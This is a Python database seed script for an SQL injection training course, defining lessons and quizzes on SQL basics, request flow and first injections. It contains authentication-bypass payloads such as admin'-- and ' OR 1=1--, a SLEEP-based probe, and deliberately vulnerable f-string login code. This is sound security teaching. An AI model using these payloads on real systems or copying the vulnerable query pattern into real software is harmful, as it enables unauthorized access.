"""Seed the database with the SQL Injection course content from modules/."""

import json

from . import db
from .models import Lesson, LessonStep, Module, User


def _j(obj):
    """Shorthand for json.dumps."""
    return json.dumps(obj)


def _opts(*pairs):
    """Build options list from (id, text) pairs."""
    return _j([{"id": p[0], "text": p[1]} for p in pairs])


USERS_TABLE = _j({
    "columns": ["id", "username", "password", "email", "role"],
    "rows": [
        [1, "alice", "s3cur3!", "alice@mail.com", "admin"],
        [2, "bob", "pass123", "bob@mail.com", "user"],
        [3, "charlie", "qwerty", "charlie@mail.com", "user"],
        [4, "diana", "hunter2", "diana@mail.com", "moderator"],
    ],
    "highlight_row": 0,
})

ICONS = {
    1: "database",
    2: "language",
    3: "terminal",
    4: "category",
    5: "bug_report",
    6: "shield",
    7: "emoji_events"
}

DESCRIPTIONS = {
    1: "Write basic SELECT, WHERE, AND/OR queries and understand how string concatenation creates danger.",
    2: "Trace the journey of user input from browser to database and identify the trust boundary.",
    3: "Craft authentication bypass payloads, use OR 1=1, SQL comments, and test injectability.",
    4: "Classify injections into In-Band, Blind, and Out-of-Band. Master UNION-based and Boolean-based techniques.",
    5: "Extract database metadata, enumerate tables via information_schema, and understand second-order injection.",
    6: "Implement parameterized queries, input validation, least privilege, and WAF as defense-in-depth.",
    7: "Analyze real SQL injection breaches (Heartland, Sony, TalkTalk) and prove your mastery in a comprehensive assessment."
}

def seed_database():
    db.drop_all()
    db.create_all()

    # Default user
    demo = User(username="demo", email="demo@bytesec.local")
    demo.set_password("demo123")
    db.session.add(demo)

    # ── MODULE 01: SQL Fundamentals Refresher ──────────────────────────────────
    m1 = Module(order_index=1, title="SQL Fundamentals Refresher", description=DESCRIPTIONS.get(1, ""), icon=ICONS.get(1, "database"), difficulty="Beginner", estimated_minutes=15)
    db.session.add(m1)
    db.session.flush()
    l1_1 = Lesson(module_id=m1.id, order_index=1, title="What is a Database? (Concept)", narrative="**Narrative**: *Imagine a massive spreadsheet with millions of rows — that's essentially a database table. SQL (Structured Query Language) is the language you use to ask it questions.*", code_snippet=None, code_language=None, table_data=USERS_TABLE)
    db.session.add(l1_1)
    db.session.flush()
    l1_2 = Lesson(module_id=m1.id, order_index=2, title="Your First Query", narrative="**Narrative**: *To retrieve data, we use the `SELECT` statement. Let's grab all usernames from the table.*", code_snippet="SELECT username FROM users;", code_language="sql", table_data=USERS_TABLE)
    db.session.add(l1_2)
    db.session.flush()
    db.session.add(LessonStep(lesson_id=l1_2.id, order_index=1, kind="predict", title="PREDICT THE OUTPUT", prompt="What will this query return?\\n```sql\\nSELECT username, role FROM users WHERE role = 'admin';\\n```", options=_opts(("A", "A) All usernames and roles"), ("B", "B) Only `alice | admin`"), ("C", "C) Only `admin`"), ("D", "D) An error")), correct_answer="B) Only `alice | admin`", explanation="*The `WHERE` clause acts as a filter. It checks each row and only returns rows that match the condition. Think of it as an `if` statement for your database.*\\n---", hints=_j([])))
    l1_3 = Lesson(module_id=m1.id, order_index=3, title="Filtering with WHERE", narrative="**Narrative**: *The `WHERE` clause is the gatekeeper. It decides which rows come back. This is also the exact place where SQL injection happens — but we'll get to that later.*", code_snippet="SELECT * FROM users WHERE username = 'bob';", code_language="sql", table_data=USERS_TABLE)
    db.session.add(l1_3)
    db.session.flush()
    db.session.add(LessonStep(lesson_id=l1_3.id, order_index=1, kind="fitb", title="FILL IN THE BLANK", prompt="Complete the query to find all users with the role `'moderator'`:\\n```sql\\nSELECT * FROM users WHERE _________;\\n```\\n**Expected Answer**: `role = 'moderator'`\\n**Acceptable variations**: `role='moderator'`, `role = \"moderator\"`", options=_j([]), correct_answer=_j([""]), explanation="*We check the `role` column and compare it to the string `'moderator'`. SQL uses single quotes for string values.*\\n---", hints=_j(["*Which column stores the user type? What value are we looking for?*"])))
    l1_4 = Lesson(module_id=m1.id, order_index=4, title="Combining Conditions: AND & OR", narrative="**Narrative**: *You can chain multiple conditions together.*", code_snippet="-- AND: Both conditions must be true\\nSELECT * FROM users WHERE role = 'user' AND id > 2;\\n\\n-- OR: At least one condition must be true  \\nSELECT * FROM users WHERE role = 'admin' OR role = 'moderator';", code_language="sql", table_data=USERS_TABLE)
    db.session.add(l1_4)
    db.session.flush()
    db.session.add(LessonStep(lesson_id=l1_4.id, order_index=1, kind="mcq", title="MULTIPLE CHOICE", prompt="What does this query return?\\n```sql\\nSELECT username FROM users WHERE role = 'user' OR role = 'admin';\\n```", options=_opts(("A", "A) `alice, bob, charlie`"), ("B", "B) `bob, charlie`"), ("C", "C) `alice`"), ("D", "D) All four users")), correct_answer="\"A\"", explanation="`alice` is admin, `bob` and `charlie` are users. `diana` is moderator, so she's excluded.", hints=_j([])))
    l1_5 = Lesson(module_id=m1.id, order_index=5, title="The Danger of String Concatenation", narrative="**Narrative**: *Here's where things get interesting. Many web applications build SQL queries by gluing strings together. Watch carefully:*\\n*If `user_input` is `bob`, the query becomes:*\\n*Looks fine, right? But what if the user types something... unexpected?*", code_snippet="SELECT * FROM users WHERE username = 'bob'", code_language="sql", table_data=USERS_TABLE)
    db.session.add(l1_5)
    db.session.flush()
    db.session.add(LessonStep(lesson_id=l1_5.id, order_index=1, kind="predict", title="PREDICT THE OUTPUT", prompt="A web app builds queries like this:\\n```python\\nquery = \"SELECT * FROM users WHERE username = '\" + user_input + \"'\"\\n```\\nIf `user_input` is: `bob' OR '1'='1`\\nWhat will the final SQL query look like?", options=_opts(("A", "A) `SELECT * FROM users WHERE username = 'bob' OR '1'='1'`"), ("B", "B) `SELECT * FROM users WHERE username = 'bob OR 1=1'`"), ("C", "C) An error will occur"), ("D", "D) `SELECT * FROM users WHERE username = 'bob'`")), correct_answer="A) `SELECT * FROM users WHERE username = 'bob' OR '1'='1'`", explanation="The single quote in the input *closes* the original string, and the rest becomes part of the SQL logic. `'1'='1'` is always true, so this returns ALL users.", hints=_j([])))
    l1_6 = Lesson(module_id=m1.id, order_index=6, title="Quick-Fire Round", narrative="", code_snippet=None, code_language=None, table_data=USERS_TABLE)
    db.session.add(l1_6)
    db.session.flush()
    db.session.add(LessonStep(lesson_id=l1_6.id, order_index=1, kind="dnd", title="DRAG & DROP", prompt="Arrange these SQL fragments to build a valid query that finds all admin users' emails:\\n**Fragments** (shuffled):\\n- `FROM users`\\n- `SELECT email`\\n- `WHERE role = 'admin'`\\n**Correct order**:\\n```sql\\nSELECT email\\nFROM users\\nWHERE role = 'admin'\\n```\\n---\\n## Module 1 Summary\\n| Concept | Key Takeaway |\\n|---------|-------------|\\n| SELECT | Retrieves data from tables |\\n| WHERE | Filters rows based on conditions |\\n| AND / OR | Combines multiple conditions |\\n| String concatenation | Building queries with user input is **dangerous** ⚠️ |\\n**Teaser for Module 02**: *Now you know SQL basics. But how does a web application actually send these queries? And where exactly does user input enter the picture? Let's find out...*", options=_j([]), correct_answer="", explanation="", hints=_j([])))

    # ── MODULE 02: How Web Apps Talk to Databases ──────────────────────────────────
    m2 = Module(order_index=2, title="How Web Apps Talk to Databases", description=DESCRIPTIONS.get(2, ""), icon=ICONS.get(2, "database"), difficulty="Beginner", estimated_minutes=15)
    db.session.add(m2)
    db.session.flush()
    l2_1 = Lesson(module_id=m2.id, order_index=1, title="The Request Journey (Concept + Visual)", narrative="**Narrative**: *When you type your username and password into a login form and click \"Submit\", a chain of events begins. Let's follow that journey.*\\n**Interactive Visual**: Animated flow diagram (student clicks \"Next\" to advance each step)", code_snippet="Step 1: [Browser]  →  User types \"alice\" and \"s3cur3!\" into a login form\\nStep 2: [Network]  →  Browser sends HTTP POST request to server\\nStep 3: [Server]   →  Backend code receives the input\\nStep 4: [Query]    →  Server builds a SQL query using the input\\nStep 5: [Database] →  Database executes the query and returns results\\nStep 6: [Response] →  Server sends \"Login successful!\" back to browser", code_language="", table_data=None)
    db.session.add(l2_1)
    db.session.flush()
    l2_2 = Lesson(module_id=m2.id, order_index=2, title="Inside the Backend Code", narrative="**Narrative**: *Let's peek behind the curtain. Here's what a typical (vulnerable!) login function looks like:*\\n**Highlight**: The f-string on line 7 is glowing red with a ⚠️ icon.", code_snippet="# Flask web application (Python)\\n@app.route('/login', methods=['POST'])\\ndef login():\\n    username = request.form['username']   # Step 1: Get user input\\n    password = request.form['password']   # Step 1: Get user input\\n    \\n    # Step 2: Build SQL query (⚠️ DANGEROUS WAY)\\n    query = f\"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'\"\\n    \\n    # Step 3: Execute query\\n    result = db.execute(query)\\n    \\n    # Step 4: Check result\\n    if result:\\n        return \"Login successful!\"\\n    else:\\n        return \"Invalid credentials.\"", code_language="python", table_data=None)
    db.session.add(l2_2)
    db.session.flush()
    db.session.add(LessonStep(lesson_id=l2_2.id, order_index=1, kind="spot", title="SPOT THE VULNERABILITY", prompt="Look at the code above. Which line introduces the security vulnerability? Click on it.\\n```python\\n# Line 1: username = request.form['username']\\n# Line 2: password = request.form['password']\\n# Line 3: query = f\"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'\"\\n# Line 4: result = db.execute(query)\\n# Line 5: if result:\\n```", options=_j([]), correct_answer="Line 3", explanation="*Line 3 directly inserts user input into the SQL string using an f-string. The user input is never validated, sanitized, or parameterized. This means whatever the user types becomes part of the SQL command.*\\n**Common wrong answer — Line 4**: *Line 4 executes the query, but the vulnerability was introduced on Line 3 when the query was built. Executing a safe query is fine — the problem is building an unsafe one.*\\n---", hints=_j([])))
    l2_3 = Lesson(module_id=m2.id, order_index=3, title="The Trust Boundary", narrative="**Narrative**: *There's an invisible line in every application called the **trust boundary**. Everything on the user's side (browser, input fields, URLs) is **untrusted**. Everything should be validated before it crosses into the server side.*", code_snippet="╔══════════════════════════╗    ╔══════════════════════════╗\\n║    🚫 UNTRUSTED ZONE     ║    ║    ✅ TRUSTED ZONE        ║\\n║                          ║    ║                          ║\\n║  • Form inputs           ║    ║  • Validated data        ║\\n║  • URL parameters        ║    ║  • Parameterized queries ║\\n║  • Cookies               ║ →→ ║  • Server-side logic     ║\\n║  • HTTP headers          ║    ║  • Database engine       ║\\n║  • Hidden form fields    ║    ║                          ║\\n╚══════════════════════════╝    ╚══════════════════════════╝\\n         TRUST BOUNDARY →→→", code_language="", table_data=None)
    db.session.add(l2_3)
    db.session.flush()
    db.session.add(LessonStep(lesson_id=l2_3.id, order_index=1, kind="mcq", title="MULTIPLE CHOICE", prompt="A developer hides the user role in a hidden HTML form field:\\n```html\\n<input type=\"hidden\" name=\"role\" value=\"user\">\\n```\\nIs this safe from tampering?", options=_opts(("A", "A) Yes, because the field is hidden from the user"), ("B", "B) Yes, because only the server can set hidden fields"), ("C", "C) No, because anything from the browser can be modified by the user"), ("D", "D) No, but only if the user knows JavaScript")), correct_answer="\"C\"", explanation="Hidden fields are still part of the HTML sent to the browser. Anyone can open DevTools, change `\"user\"` to `\"admin\"`, and submit the form. **Never trust client-side data.**", hints=_j([])))
    l2_4 = Lesson(module_id=m2.id, order_index=4, title="Following the Injection Path", narrative="**Narrative**: *Let's trace exactly what happens when an attacker enters a malicious input into our vulnerable login form.*\\n**Interactive Step-Through** (student clicks to advance):\\n**Normal Login**:\\n**Attack Login**:\\n**Breakdown**:\\n- `'` → Closes the opening quote for username\\n- `OR 1=1` → Makes the WHERE clause always true\\n- `--` → Comments out the rest of the query (password check is ignored!)", code_snippet="Input:  username = ' OR 1=1 --    password = anything\\nQuery:  SELECT * FROM users WHERE username = '' OR 1=1 --' AND password = 'anything'\\nResult: ⚠️ Returns ALL rows → Login successful (as first user!)", code_language="", table_data=None)
    db.session.add(l2_4)
    db.session.flush()
    db.session.add(LessonStep(lesson_id=l2_4.id, order_index=1, kind="predict", title="PREDICT THE OUTPUT", prompt="Given this backend code:\\n```python\\nquery = f\"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'\"\\n```\\nIf the attacker enters:\\n- Username: `admin'--`\\n- Password: `doesntmatter`\\nWhat is the final SQL query?", options=_opts(("A", "A) `SELECT * FROM users WHERE username = 'admin'--' AND password = 'doesntmatter'`"), ("B", "B) `SELECT * FROM users WHERE username = 'admin--' AND password = 'doesntmatter'`"), ("C", "C) `SELECT * FROM users WHERE username = 'admin' AND password = 'doesntmatter'`"), ("D", "D) An error occurs")), correct_answer="A) `SELECT * FROM users WHERE username = 'admin'--' AND password = 'doesntmatter'`", explanation="The `'` closes the username string, and `--` comments out everything after it. The effective query is:", hints=_j([])))
    l2_5 = Lesson(module_id=m2.id, order_index=5, title="Where Can Injection Happen?", narrative="**Narrative**: *SQL injection isn't limited to login forms. Any place where user input touches a SQL query is a potential entry point.*", code_snippet="🔴 Login forms          → username, password fields\\n🔴 Search bars          → search query parameter\\n🔴 URL parameters       → /product?id=5\\n🔴 Cookie values        → session tokens, preferences\\n🔴 HTTP headers         → User-Agent, Referer\\n🔴 File upload names    → filename metadata\\n🔴 API request bodies   → JSON/XML payloads", code_language="", table_data=None)
    db.session.add(l2_5)
    db.session.flush()
    db.session.add(LessonStep(lesson_id=l2_5.id, order_index=1, kind="dnd", title="DRAG & DROP (Matching)", prompt="Match each user input source to its injection risk scenario:\\n| Input Source | Scenario |\\n|-------------|----------|\\n| Search bar | `SELECT * FROM products WHERE name LIKE '%____%'` |\\n| URL parameter | `SELECT * FROM products WHERE id = ___` |\\n| Login form | `SELECT * FROM users WHERE username = '___'` |\\n| Cookie | `SELECT * FROM sessions WHERE token = '___'` |\\n**Student drags** input sources to the correct query template.", options=_j([]), correct_answer="Each source maps to the scenario where that type of input would be interpolated into a query.", explanation="", hints=_j([])))
    db.session.add(LessonStep(lesson_id=l2_5.id, order_index=2, kind="mcq", title="MULTIPLE CHOICE", prompt="A web app has this URL for viewing products:\\n```\\nhttps://shop.com/product?id=42\\n```\\nThe backend code is:\\n```python\\nproduct_id = request.args.get('id')\\nquery = f\"SELECT * FROM products WHERE id = {product_id}\"\\n```\\nWhat makes this **especially** dangerous compared to string-based injection?", options=_opts(("A", "A) Numbers can't be injected"), ("B", "B) There are no quotes to escape, so the attacker doesn't need to close any string"), ("C", "C) URL parameters are automatically sanitized"), ("D", "D) GET requests are safer than POST requests")), correct_answer="\"B\"", explanation="Since the id is a number, it's inserted without quotes. The attacker doesn't even need to worry about quote characters. They can simply append SQL:", hints=_j([])))

    # ── MODULE 03: Your First Injection ──────────────────────────────────
    m3 = Module(order_index=3, title="Your First Injection", description=DESCRIPTIONS.get(3, ""), icon=ICONS.get(3, "database"), difficulty="Intermediate", estimated_minutes=20)
    db.session.add(m3)
    db.session.flush()
    l3_1 = Lesson(module_id=m3.id, order_index=1, title="Breaking the String Barrier (Concept)", narrative="**Narrative**: *SQL injection is all about one thing: **escaping the data context**. When you type into a form, the app expects your input to be data — a username, a search term. But if your input contains special SQL characters, it stops being data and starts being **code**.*\\n**Key Concept**: The single quote `'` is the escape character. It breaks you out of the string context.", code_snippet="Normal input:    alice\\n                 ↓\\nQuery becomes:   ... WHERE username = 'alice'\\n                                       ^^^^^ ← stays inside quotes (DATA)\\n\\nMalicious input: alice' OR '1'='1\\n                 ↓\\nQuery becomes:   ... WHERE username = 'alice' OR '1'='1'\\n                                       ^^^^^          ← escapes quotes (CODE!)", code_language="", table_data=None)
    db.session.add(l3_1)
    db.session.flush()
    l3_2 = Lesson(module_id=m3.id, order_index=2, title="The Classic Authentication Bypass", narrative="**Narrative**: *Let's build our first real injection. Here's the target — a simple login form connected to this backend:*\\n*Our goal: Log in as `admin` without knowing the password.*\\n**Step-by-step walkthrough** (student advances each step):\\n**Step 1 — Understand the template**:\\n**Step 2 — Close the username string**:\\n**Step 3 — Add always-true condition**:\\n**Step 4 — Comment out the rest**:\\n✅ **Success!** Password check is completely bypassed.", code_snippet="Input: admin'--\\nQuery: SELECT * FROM users WHERE username = 'admin'--' AND password = '...'\\n                                                   ↑↑ everything after -- is ignored\\nEffective: SELECT * FROM users WHERE username = 'admin'", code_language="", table_data=None)
    db.session.add(l3_2)
    db.session.flush()
    db.session.add(LessonStep(lesson_id=l3_2.id, order_index=1, kind="sandbox", title="LIVE SQL SANDBOX", prompt="Log in as `admin` without using the correct password.\\n**Input fields**:\\n- Username: `[_______________]`\\n- Password: `[_______________]`\\n**Live query display**: Shows the constructed query in real-time as the student types.\\n**Accepted answers** (any of these in the username field):\\n```\\nadmin'--\\nadmin' --\\nadmin'--\\n' OR 1=1--\\n' OR '1'='1'--\\nadmin' OR 1=1--\\n```\\n**On success**: 🎉 Animation: \"Access Granted! You're in as admin.\" + Show the effective query and explain why it worked.\\n**On failure**: Show the constructed query and highlight the syntax error or why it didn't return results.\\n---", options=_j([]), correct_answer="", explanation="", hints=_j(["*Remember, `'` closes the string and `--` comments out the rest.*", "*Try typing `admin'--` as the username.*"])))
    l3_3 = Lesson(module_id=m3.id, order_index=3, title="Variations on the Theme", narrative="**Narrative**: *There's more than one way to bypass a login. Let's explore different payloads and understand why each works.*", code_snippet=None, code_language=None, table_data=None)
    db.session.add(l3_3)
    db.session.flush()
    db.session.add(LessonStep(lesson_id=l3_3.id, order_index=1, kind="mcq", title="MULTIPLE CHOICE", prompt="Using the payload `' OR 1=1--` as the username, which user will the attacker log in as?\\n```\\nusers table:\\nid=1  alice (admin)\\nid=2  bob (user)\\nid=3  charlie (user)\\n```", options=_opts(("A", "A) alice (the first row returned)"), ("B", "B) bob"), ("C", "C) charlie"), ("D", "D) All users simultaneously")), correct_answer="\"A\"", explanation="The query `WHERE username = '' OR 1=1` returns ALL rows, but the application typically takes the **first result**. Since `alice` has `id=1`, she's returned first. The attacker logs in as alice (the admin!).", hints=_j([])))
    l3_4 = Lesson(module_id=m3.id, order_index=4, title="Injection Without Comments", narrative="**Narrative**: *Some databases don't support `--` comments, or the app filters them out. Can you still inject? Absolutely.*\\n**The trick**: Instead of commenting out the rest, **complete the query's syntax**.\\nEvery condition has balanced quotes. No comments needed!", code_snippet="Input username: ' OR '1'='1\\nInput password: ' OR '1'='1\\n\\nResult:\\nSELECT * FROM users WHERE username = '' OR '1'='1' AND password = '' OR '1'='1'", code_language="", table_data=None)
    db.session.add(l3_4)
    db.session.flush()
    db.session.add(LessonStep(lesson_id=l3_4.id, order_index=1, kind="fitb", title="FILL IN THE BLANK", prompt="Complete the injection payload that bypasses login WITHOUT using SQL comments (`--` or `#`):\\nUsername: `' OR '1'='1`\\nPassword: `____________`\\n**Expected Answer**: `' OR '1'='1`", options=_j([]), correct_answer=_j([""]), explanation="*By making both fields use the same trick, you maintain balanced quotes throughout the query. Both conditions become always-true, and no comment syntax is needed.*\\n---", hints=_j([])))
    l3_5 = Lesson(module_id=m3.id, order_index=5, title="Different Comment Styles", narrative="**Narrative**: *Different databases use different comment syntaxes. Knowing which one to use is essential.*\\n⚠️ **MySQL gotcha**: MySQL requires a **space after `--`**. So `admin'--` won't work, but `admin'-- ` will. Alternatively, use `admin'#`.", code_snippet=None, code_language=None, table_data=None)
    db.session.add(l3_5)
    db.session.flush()
    db.session.add(LessonStep(lesson_id=l3_5.id, order_index=1, kind="mcq", title="MULTIPLE CHOICE", prompt="You're attacking a MySQL database. Your payload `admin'--` isn't working. What should you try instead?", options=_opts(("A", "A) `admin'-- ` (add a space after --)"), ("B", "B) `admin'//`"), ("C", "C) `admin'\\n`"), ("D", "D) `admin'**`")), correct_answer="\"A\"", explanation="MySQL requires a space (or other whitespace) after `--` for it to be treated as a comment. Alternatively, `admin'#` would also work since MySQL supports `#` as a comment character.", hints=_j([])))
    l3_6 = Lesson(module_id=m3.id, order_index=6, title="Detecting Injectability", narrative="**Narrative**: *Before crafting a full injection, attackers first test whether a field is injectable. Here are the classic probing techniques:*\\n**Probe 1 — The Single Quote Test**:\\n**Probe 2 — The Boolean Test**:\\n**Probe 3 — The Time-Based Test**:", code_snippet="Input: ' OR SLEEP(5)--\\nIf response takes 5+ seconds → Field is injectable!", code_language="", table_data=None)
    db.session.add(l3_6)
